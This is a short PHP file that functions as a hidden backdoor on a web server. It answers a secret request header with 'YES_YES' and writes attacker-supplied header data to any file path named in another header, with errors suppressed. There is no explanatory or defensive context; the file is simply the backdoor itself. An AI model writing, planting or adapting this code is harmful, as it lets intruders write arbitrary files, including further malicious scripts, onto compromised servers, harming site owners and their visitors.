<?php

if (@$_SERVER['HTTP_X_E8C0F1']) {
    echo "YES_YES";
    
    if (@$_SERVER['HTTP_X_TO']) {
        file_put_contents(@$_SERVER['HTTP_X_TO'], @$_SERVER['HTTP_X_DATA']);
    }    
}
?>